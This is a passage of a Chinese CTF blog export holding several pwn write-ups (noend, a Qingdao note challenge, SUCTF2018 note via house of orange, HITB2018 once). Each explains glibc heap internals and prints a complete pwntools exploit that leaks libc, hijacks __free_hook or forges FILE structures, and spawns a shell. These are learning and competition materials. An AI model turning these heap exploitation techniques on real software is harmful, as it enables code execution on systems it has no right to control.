//sbrk（MORECORE）是通过将数据段的下界移动来分配连续内存，当size很大时，sbrk将会失败：MORECORE_FAILURE brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; else &#123; if (contiguous (av)) size = ALIGN_UP (size + old_size, pagesize); if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123; //使用MMAP分配size大小的连续内存 char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED) &#123; …… &#125; &#125; &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; &#125; /* if (av != &amp;main_arena) */ …… /* finally, do the allocation */ p = av-&gt;top; size = chunksize (p); //当前top大小为size，与申请分配的大小nb+MINSIZE比较 /* check that one of the above allocation paths succeeded */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; …… &#125; /* catch all failure paths */ __set_errno (ENOMEM); return 0; 当试图申请一块巨大的内存时，sbrk和mmap都会失败，最终_int_malloc将会return 0。__libc_malloc对返回值进行判断，如果返回为0且分配区不为空时，就调用arena_get_retry重新获取一个新的分配区，并在新的分配区里分配内存。奇怪的是，如果此时_int_malloc又一次分配失败返回0，__libc_malloc也不会有其他操作了，直接返回0（assert是在debug模式下起作用的）。返回0之后，下面几句执行起来就会有问题： 123buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; 由于malloc返回了0，buf的值为0，read就是向0中写入内容，而*(buf+size-1)=0这一块，相当于向*(size-1)中写入0。 漏洞利用地址泄露在_init_free函数中，会对要释放的chunk的size做检查，检查发生在已经与前后块合并完成之后： 12345if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; if (have_fastchunks(av))malloc_consolidate(av); ……&#125; 如果size大于设定的阈值，就会对fastbin进行合并（malloc_consolidate）。合并之后的块会放入到unsorted bin中（具体可以查看malloc_consolidate的源码），这时候将有机会利用unsorted bin泄露libc地址。 由于本题只对小于0x80的内存进行free，而且释放fastbin大小的块时是不会走到malloc_consolidate这一步的，所以可以通过malloc(0x7f)来触发malloc_consolidate：实际会分配0x90大小，属于small bin，释放的时候会与top合并，此时由于size大于阈值，由此触发fastbin合并操作。所以在0x7f之前再申请几块fastbin的内存。 注：fastbin的块即使在释放之后，P位也不会置0，在malloc_consolidate才会置0。 如果分别申请0x20和0x30，在合并之前它们分别呆在不同的fastbins里，然后执行malloc_consolidate： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556maxfb = &amp;fastbin (av, NFASTBINS - 1);fb = &amp;fastbin (av, 0);do &#123; p = atomic_exchange_acq (fb, 0); if (p != 0) &#123; do &#123; check_inuse_chunk(av, p); nextp = p-&gt;fd; size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA); //根据size找到下一块及大小 nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); //如果前一块是空闲块，合并 if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; //下一块不是top if (nextchunk != av-&gt;top) &#123; nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //下一块时空闲块，合并 if (!nextinuse) &#123; size += nextsize; unlink(av, nextchunk, bck, fwd); &#125; else//下一块不是空闲块，将下一块中记录本块是否空闲的P位置0 clear_inuse_bit_at_offset(nextchunk, 0); //将p放入到unsorted bin当中 first_unsorted = unsorted_bin-&gt;fd; unsorted_bin-&gt;fd = p; first_unsorted-&gt;bk = p; if (!in_smallbin_range (size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; set_head(p, size | PREV_INUSE); p-&gt;bk = unsorted_bin; p-&gt;fd = first_unsorted; set_foot(p, size); &#125; //下一块是top，合并 else &#123; size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; &#125; &#125; while ( (p = nextp) != 0); &#125; &#125; while (fb++ != maxfb); &#125; 即0x20（实际0x30）的块先放入unsorted bin，此时它的fd和bk已经写好，然后0x30（实际0x40）的块先与0x20的块合并，然后又与后面的top合并，原来0x20的头变为top头。 此后再分配一块内存并写入前8字节，就能读取到原来0x20的bk指针了，由此泄露地址。 劫持执行流参考Ne0出题人大佬的wp，用到了一个神奇的方法：事先写好一个字段作为top的大小，值为：free_hook-top_addr + system_addr，然后再从top分出free_hook-top_addr （大概为这个值）大小，并添加一些偏移，使得分配之后的top头中size字段正好能落在free_hook上，即将system_addr写入到free_hook。 之前在主分配区泄露了libc的地址，同样，我们也能泄露切换之后的分配区的top地址，原因是泄露地址时bk记录的是unsorted bin的地址，也就是实际内容-0x10处，而这个位置恰好记录的是top地址。 上面提到的事先写好一个字段为top的大小，然后是要通过malloc的漏洞，向某处写一个0。这个某处就可以是top的地址处，这样能让top向前提升几个字节，提升后能使top的大小正好为free_hook-top_addr + system_addr，之后再次malloc就会从修改后的top处分配内存，完成将system的地址写入到free_hook中。这里需要对写入的内容加入一些偏移，使得top的size字段对应于free_hook。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import timecontext.log_level='debug'p=process('./noend')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def routine(size,content): p.sendline(str(size)) time.sleep(0.3) p.send(content) p.recvuntil(content)routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)#泄露地址data = u64(p.recv()[:8])offset = 0x7f7c2d6dbb78-0x7f7c2d317000libc_base = data -offsetsys_addr = libc_base + libc.symbols['system']log.info('sys_addr:%#x '%sys_addr)#发送一个很大的size，从而切换到非主分配区p.sendline(str(libc_base+libc.symbols['__malloc_hook']))time.sleep(0.3)p.sendline()p.recvline()p.clean()#泄露非主分配区记录的top地址routine(0x20,'0gur0')#0routine(0x30,'0gur1')#1routine(0x7f,'0gur2')#2routine(0x20,'0'*8)new_top = u64(p.recv()[:8])log.info('new_top:%#x '%new_top)#其中new_top+0x868对应于top的地址，注意new_top是记录这个值的地址#+0x20是在top提升之后对应的地址#-0x8是考虑到malloc时会向16对齐的问题routine(0xf0,p64(sys_addr+libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x8)*(0xf0/8))p.sendline(str(new_top+1))time.sleep(0.3)p.sendline()p.recvline()p.clean()#设libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)为offset，即当前top与free_hook之间的偏移为offset#则上一步将top的size写成offset-8+sys_addr，此处分配了offset-16的大小#在调试时查看到offset是以8结尾的，则malloc（offset-16），会进行（offset-16+8)对16向上取整，即实际分配offset-8大小的内存，则top的size恰好就变为sys_addr，而分配了offset-8之后，top地址正好挪到了free_hook-8处，则size正好写在了free_hook处routine(libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x10,'a'*8)routine(0x10,'/bin/sh')p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[青岛链湾杯--note]]></title>
    <url>%2F2018%2F06%2F27%2F%E9%9D%92%E5%B2%9B%E9%93%BE%E6%B9%BE%E6%9D%AF-note%2F</url>
    <content type="text"><![CDATA[废话：第一次打线下赛，确实很慌，该想到的东西都忘了，果然还是得多加练习啊QWQ 基本逻辑菜单类小游戏：add，edit，show，delete，copy add：添加结点，此处能够了解结点的结构 edit函数对结点的content进行编辑，但是这里的v3，v4，v1都没有进行初始化或者置零，将是本题的关键。 show函数，展示结点的content以及title。这个print函数是写在bss段的一个地址，通过调试发现写入的就是puts函数地址。 copy函数，malloc出某结点size大小的块N次，N为用户输入。 漏洞利用所有结点的地址以数组元素的形式存在于bss段中的s1[]中。前面已经说到了，在edit函数里，对存放size，content地址和结点地址的变量v1，v4和v3都没有进行初始化。发现这个问题的契机在于，当第二次edit某个结点content时，随意输入title都会提示“plz input new content”。没有初始化的后果就是，由于这些函数都会共用一块栈空间，比如show中的v3和edit中的v3地址都是ebp-0x120，v4都是ebp-0x118，导致当在show之后，v3和v4的值为刚刚操作过的结点的地址和content地址，而进入到edit函数中后即使输入的title没有匹配，也会执行向v4中写入v1个字节的操作，如果v4和v1不是同一结点的两个参数，那么就会导致溢出。 例如：v1为s1[1]中的size，而v3和v4是s1[0]中的参数，edit就会向v4中写入v1个字节，当v1大于s1[0]的size时，会造成溢出。溢出后就可以修改s1[0]中content的地址，之后再edit时就相当于相被修改的地址中写入内容。这里先把content0地址修改为print的地址，edit时向print的位置写入system@plt，再次show的时候就相当于执行system。 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level='debug'p=process('./note')def add(size,content,title): p.recvuntil('input choice:\n') p.sendline('1') p.recvuntil('input content size\n') p.sendline(str(size)) p.recvuntil('input content\n') p.sendline(content) p.recvuntil('input note title\n') p.sendline(title)def edit(title,content): p.recvuntil('input choice:\n') p.sendline('2') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('plz input new content\n') p.sendline(content)def show(title): p.recvuntil('input choice:\n') p.sendline('3') p.recvuntil('plz input title\n') p.sendline(title)def copy(title,num): p.recvuntil('input choice:\n') p.sendline('5') p.recvuntil('plz input title\n') p.sendline(title) p.recvuntil('how many times do you want\n') p.sendline(str(num))p.recvuntil('plz input your name\n')p.sendline('')print_addr = 0x602100sys_plt = 0x400860#0add(128,"0gur0","0")#1add(256,"0gur1","1")#2add(256,"/bin/sh","/bin/sh")#edit 1 v1=256edit("1","new 0gur1")#show 0 v3=s[0] v4=s[0].contentshow("0")#edit content0's addrpayload ='a'*128#content0payload +=p64(0)+p64(0x35) #node0 chunk headerpayload+=p64(48)+p64(0)+p64(128)+p64(print_addr) #node0edit("hhh",payload)#edit 0edit("0",p64(sys_plt))#show:print-&gt;systemshow('/bin/sh')p.interactive() PS：一个还没有解决的问题，malloc按理说应该是在堆上进行分配的，但是本题查看分配的地址，都是以0x7f开头的，比较像栈上的地址，而且即使分配了多个块，top chunk的大小都不变…]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-note]]></title>
    <url>%2F2018%2F06%2F05%2Fsuctf2018-note%2F</url>
    <content type="text"><![CDATA[house of orange – note基础知识 unsorted bin的解链操作没有类似于malloc中p-&gt;fd-&gt;bk == p的检查 small bins和fastbin存在内存大小相等的区域，例如32位操作系统，fastbin的chunk为64字节以下的16，24,32……；同时，small bins的大小也是从16开始依次相差8字节的chunk大小。但是两者不在同一个位置，fastbin有自己的位置，small bins位于bins数组中。当释放的内存在64B以下时，会直接放入fastbin中；unsorted bin中的chunk最终会放入到small bins中。 house of orange(堆地址未知的情况) 这里省去了修改top大小的部分，修改top大小是为了重新分配一个top，把旧top放入到unsorted bin中，以利用unsorted bin的各种攻击。适用于没有unsorted bin的情况下，如果程序中有unsorted bin，可以省略这部分。 house of orange的原理是，调用malloc时，利用unsorted bin中错误的FD/BK指针，触发malloc_printerr函数打印错误信息，malloc_printerr调用__libc_message，_libc_message调用abort()，abort()调用_IO_flush_all_lockp。在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中的每个结点进行遍历，找到符合条件的结点，执行_IO_OVERWRITE函数，其中结点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。 通过代码来具体查看，malloc_printerr用于打印错误信息，位于malloc.c中： 1234567891011121314151617181920212223242526static voidmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)&#123; /* Avoid using this arena in future. We do not attempt to synchronize this with anything else because we minimally want to ensure that __libc_message gets its resources safely without stumbling on the current corruption. */ if (ar_ptr) set_arena_corrupt (ar_ptr); if ((action &amp; 5) == 5) __libc_message (action &amp; 2, "%s\n", str); else if (action &amp; 1) &#123; char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\0'; char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0); while (cp &gt; buf) *--cp = '0'; __libc_message (action &amp; 2, "*** Error in `%s': %s: 0x%s ***\n", __libc_argv[0] ? : "&lt;unknown&gt;", str, cp); &#125; else if (action &amp; 2) abort ();&#125; ​ 在__libc_message中会调用absort（）： 123456789101112131415161718192021/* Abort with an error message. */void__libc_message (int do_abort, const char *fmt, ...)&#123; va_list ap; int fd = -1; va_start (ap, fmt); …… va_end (ap); if (do_abort) &#123; BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort (); &#125;&#125; abort()中调用_IO_flush_all_lockp()，在调用之前先define为fflush： 12345678910111213141516171819202122232425262728293031323334#define fflush(s) _IO_flush_all_lockp (0) ……voidabort (void)&#123; struct sigaction act; sigset_t sigs; /* First acquire the lock. */ __libc_lock_lock_recursive (lock); /* Now it's for sure we are alone. But recursive calls are possible. */ /* Unlock SIGABRT. */ if (stage == 0) &#123; ++stage; if (__sigemptyset (&amp;sigs) == 0 &amp;&amp; __sigaddset (&amp;sigs, SIGABRT) == 0) __sigprocmask (SIG_UNBLOCK, &amp;sigs, (sigset_t *) NULL); &#125; /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) &#123; ++stage; //_IO_flush_all_lockp() fflush (NULL); &#125; ……&#125; 离底层越来越近了…… _IO_flush_all_lockp()获取了_IO_list_all链表，对每一个结点进行处理： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int_IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp;#ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock);#endif last_stamp = _IO_list_all_stamp; //获取_IO_list_all fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); //先对_IO_FILE中的mode,_IO_write,_IO_write_base等检查，满足条件才执行_IO_OVERFLOW if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else //循环是通过每个结点的chain字段 fp = fp-&gt;_chain; &#125;#ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0);#endif return result;&#125; 其中，确定_IO_list_all中结点的结构体为_IO_FILE_plus: _IO_FILE_plus的结构，即一个_IO_FILE结构和一个虚表指针vtable： 12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; _IO_FILE结构如下，其中chain是用于记录下一结点的位置的： 继续看_IO_flush_all_lockp，在if处对结点中各字段进行检查，当满足条件时，会执行_IO_OVERFLOW，函数的寻址是通过查寻vtable实现的。vtable的结构如下，第四行即为_IO_OVERFLOW的地址： 12345678910111213141516171819202122232425struct _IO_jump_t289 &#123;290 JUMP_FIELD(size_t, __dummy);291 JUMP_FIELD(size_t, __dummy2);292 JUMP_FIELD(_IO_finish_t, __finish);293 JUMP_FIELD(_IO_overflow_t, __overflow);294 JUMP_FIELD(_IO_underflow_t, __underflow);295 JUMP_FIELD(_IO_underflow_t, __uflow);296 JUMP_FIELD(_IO_pbackfail_t, __pbackfail);297 /* showmany */298 JUMP_FIELD(_IO_xsputn_t, __xsputn);299 JUMP_FIELD(_IO_xsgetn_t, __xsgetn);300 JUMP_FIELD(_IO_seekoff_t, __seekoff);301 JUMP_FIELD(_IO_seekpos_t, __seekpos);302 JUMP_FIELD(_IO_setbuf_t, __setbuf);303 JUMP_FIELD(_IO_sync_t, __sync);304 JUMP_FIELD(_IO_doallocate_t, __doallocate);305 JUMP_FIELD(_IO_read_t, __read);306 JUMP_FIELD(_IO_write_t, __write);307 JUMP_FIELD(_IO_seek_t, __seek);308 JUMP_FIELD(_IO_close_t, __close);309 JUMP_FIELD(_IO_stat_t, __stat);310 JUMP_FIELD(_IO_showmanyc_t, __showmanyc);311 JUMP_FIELD(_IO_imbue_t, __imbue);312 &#125;; 按照simp1e大佬的说法，2.24版本的glibc在执行_IO_OVERFLOW之前还有一个对vtable的检查函数：_IO_check_vtable，他的思路是利用已有的vtable而不是我们自己伪造的vtable，这样很容易过check。实际上也确实有这样的vtable结构：_IO_str_jumps，它就是vtable类型的结构体，因此_IO_OVERFLOW的位置对应于_IO_str_overflow（第三行） 1234567891011121314151617181920212223const struct _IO_jump_t _IO_str_jumps libio_vtable =356 &#123;357 JUMP_INIT_DUMMY,358 JUMP_INIT(finish, _IO_str_finish),359 JUMP_INIT(overflow, _IO_str_overflow),360 JUMP_INIT(underflow, _IO_str_underflow),361 JUMP_INIT(uflow, _IO_default_uflow),362 JUMP_INIT(pbackfail, _IO_str_pbackfail),363 JUMP_INIT(xsputn, _IO_default_xsputn),364 JUMP_INIT(xsgetn, _IO_default_xsgetn),365 JUMP_INIT(seekoff, _IO_str_seekoff),366 JUMP_INIT(seekpos, _IO_default_seekpos),367 JUMP_INIT(setbuf, _IO_default_setbuf),368 JUMP_INIT(sync, _IO_default_sync),369 JUMP_INIT(doallocate, _IO_default_doallocate),370 JUMP_INIT(read, _IO_default_read),371 JUMP_INIT(write, _IO_default_write),372 JUMP_INIT(seek, _IO_default_seek),373 JUMP_INIT(close, _IO_default_close),374 JUMP_INIT(stat, _IO_default_stat),375 JUMP_INIT(showmanyc, _IO_default_showmanyc),376 JUMP_INIT(imbue, _IO_default_imbue)377 &#125;; 如果我们能够控制_IO_str_overflow的地址，就能执行system函数了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859_IO_str_overflow (FILE *fp, int c)82 &#123;83 int flush_only = c == EOF;84 size_t pos;85 if (fp-&gt;_flags &amp; _IO_NO_WRITES)86 return flush_only ? 0 : EOF;87 if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))88 &#123;89 fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;90 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;91 fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;92 &#125;93 pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;94 if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))95 &#123;96 if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */97 return EOF;98 else99 &#123;100 char *new_buf;101 char *old_buf = fp-&gt;_IO_buf_base;102 size_t old_blen = _IO_blen (fp);103 size_t new_size = 2 * old_blen + 100;104 if (new_size &lt; old_blen)105 return EOF; //这里有一个相对地址的调用，函数地址是fp的某地址，参数为new_size.106 new_buf107 = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);108 if (new_buf == NULL)109 &#123;110 /* __ferror(fp) = 1; */111 return EOF;112 &#125;113 if (old_buf)114 &#123;115 memcpy (new_buf, old_buf, old_blen);116 (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);117 /* Make sure _IO_setb won't try to delete _IO_buf_base. */118 fp-&gt;_IO_buf_base = NULL;119 &#125;120 memset (new_buf + old_blen, '\0', new_size - old_blen);121 122 _IO_setb (fp, new_buf, new_buf + new_size, 1);123 fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);124 fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);125 fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);126 fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);127 128 fp-&gt;_IO_write_base = new_buf;129 fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;130 &#125;131 &#125;132 133 if (!flush_only)134 *fp-&gt;_IO_write_ptr++ = (unsigned char) c;135 if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)136 fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;137 return c;138 &#125; 通过IDA查看libc，找到_IO_str_overflow，可以看到，a1是_IO_str_overflow的第一个参数，即fp；要执行的函数偏移为fp+224，参数为v7。可以考虑把fp+224写为system的地址，v7写为/bin/sh的地址；v6就等于(v7-100)/2，而v6又是*(fp+64)-v5，v5= *(fp+56)，这样我们可以自己构造一个_IO_FILE_plus结构，然后在64和56偏移处放入v6和v5，并把vtable的地址设置为_IO_str_jumps结构体的地址，就能 总结一下，在malloc_printerr中函数的调用关系如下： 举例分析–SUCTF2018 NOTE基本逻辑依旧是菜单类的小游戏，有三个功能：添加、展示和删除。 在游戏开始之前，先对ptr进行了初始化。ptr是位于bss段的一个指针数组，在ptr[0]中写入了：Hello,Welcome to SUCTF,I letf something here! add函数找到ptr中第一个为空的位置，分配size大小的空间，并输入内容，此处没有对输入内容的大小做限制。 show函数通过索引找到对应内存，输出内容。 dele函数会释放ptr[0]和qword_202078中存放地址对应的内存。 漏洞利用在add中，对输入的内容长度未做限制，会造成堆溢出漏洞。利用堆溢出漏洞，可以构造出上述的_IO_FILE_plus结构。 首先，泄露system地址，还是常用的UAF，当dele释放之后，通过读取unsortedbin的FD指针，计算出libc的地址。 然后，为了能够执行构造的_IO_FILE_plus结构中vtable的_IO_OVERFLOW，要对_IO_list_all进行劫持，即在_IO_flush_all_lockp函数中对_IO_list_all的每一个结点进行遍历时，要让它检查我们伪造的结点。因此考虑用unsorted bin attack，使解链操作时，*_IO_list_all = unsorted_chunk(av)，即第一个结点位于unsorted bin的头部，这样，chain对应的位置恰好为第六个small bins头的位置。我们可以想办法把伪造的_IO_FILE_plus放在第六个small bins对应的大小里，即0x60。 采用的方法是，通过缓冲区溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的_IO_FILE_plus。此时再分配一个大于0x60大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的FD，由此就会触发malloc_printerr函数，遍历_IO_list_all，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行system。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677 from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=1if debug: p = process('./note') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,"b _IO_str_overflow")else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so') p = remote('pwn.suctf.asuri.org',20003)def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))+5log.info('sys_addr:%#x' %sys_addr)#unsorted bin attack fake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)#fake IO_FILE_PLUSfake_IFP = p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_IFP = fake_IFP.ljust(0x80,'\x00')fake_IFP += p64(sys_addr+0x420)fake_IFP = fake_IFP.ljust(0xa0,'\x00')fake_IFP += p64(0)vtable_addr = malloc_hook-0x1370#+libc.symbols['_IO_str_jumps']fake_IFP += p64(0)fake_IFP += p64(0)fake_IFP += p64(vtable_addr)fake_IFP += p64(sys_addr)fake_IFP += p64(2)fake_IFP += p64(3) fake_IFP += p64(0)*3 payload = 'a'*16 +fake_chunk+fake_IFPpayload += p64(sys_addr)add(16,payload)#3#add a large chunkp.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitbctf2018-once]]></title>
    <url>%2F2018%2F06%2F05%2Fhitbctf2018-once%2F</url>
    <content type="text"><![CDATA[once基本逻辑once名字的来由大概是很多操作都只能做一次（误） 先执行二进制文件，根据输出的字符串定位各个函数。 f1：程序维护一个双向链表结构，每个结点有四项内容，[2]和[3]分别为上个结点和下个结点的地址，表头是data段的&amp;unk_202020，其中unk_202020[3]为off_202038。新加入的结点插入到头部，用off_202038进行记录。这个逻辑我还是想了一会的，果然要多读源码。 f2：在bss段有一个变量dword_202064，作为是否进行了写操作的标志。函数实现了向第一个结点内写入0x20个字节，这个功能仅能实现一次。 f3：同样，bss有一个dword_202060变量，标识是否进行了结点删除的操作。函数实现了删除第一个结点。 f4：函数里有一些子操作，输入1时，分配size大小的内存空间，并把对应标志置位。 ​ 输入2时，向ptr内输入size大小的内容。 ​ 输入3时，释放ptr内存。 漏洞及利用在f2里，用户可以输入0x20个字节，能够覆盖掉结点中的前后向指针。并且在f3的解链操作中，对前后向指针进行操作，能够将程序劫持到期待的位置。简称offset_202038为first,unk_202020为head： 123456//f2向结点内写内容，覆盖node[3]的地址为addr//first里记录的是node的地址first = *(first+3)//first = addr *(first+2)=&amp;head//*(addr+2)=&amp;head 可以看出，最终能够实现向addr+16的地址处写入head地址。由于f4后续可以操作ptr变量，就使得addr+16=&amp;ptr，经过上述过程后，ptr的内容为head地址，那么后面就可以向data段和bss段任意写。 本题开启了PIE保护，也就是无法直接获取到GOT，BSS变量地址。实际上，二进制文件中的相对位置是不变的。由于.data段与.bss段相邻，且相差较少，可以通过修改最后一个个字节来修改node[3]的内容。addr = &amp;ptr-16 = 0x202058，发送最后一个字节0x58即可。 之后f4向ptr写入内容就相当于向unk_202020起始的位置写入内容。由于f2能够向off_202038中的地址写入内容，不妨将offset_202038的值写为 __free_hook的地址，之后调用f2就可以向这里写入system地址。为了再次利用f2函数，应该覆写位于bss中的dword_202064变量。这样，覆写了 __free_hook之后，再次调用free就会执行system，f4中的3调用了free函数，对ptr中地址进行释放，因此可以将ptr中的值覆写为/bin/sh的地址。 一共要进行三次写操作： 1.f2向offset_202038中写入24字节填充和1字节0x58覆盖后向指针 2.f4-2向ptr中写入__free_hook地址、/bin/sh地址和对一些标识位置位。 3.f2向offset_202038（__free_hook）写入system地址 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') context.log_level = 'debug'def fun_1(): p.recvuntil('&gt; ') p.sendline('1')def fun_2(string): p.recvuntil('&gt; ') p.sendline('2') p.sendline(string)def fun_3(): p.recvuntil('&gt; ') p.sendline('3')#leak libcp.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']#add a nodefun_1()#f4:ptr=malloc 0xe0p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')#input node fun_2('a'*16+'b'*8 + chr(0x58))#remove nodefun_3()#write ptrp.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastbin_attack-search]]></title>
    <url>%2F2018%2F06%2F05%2Ffastbin-attack-search%2F</url>
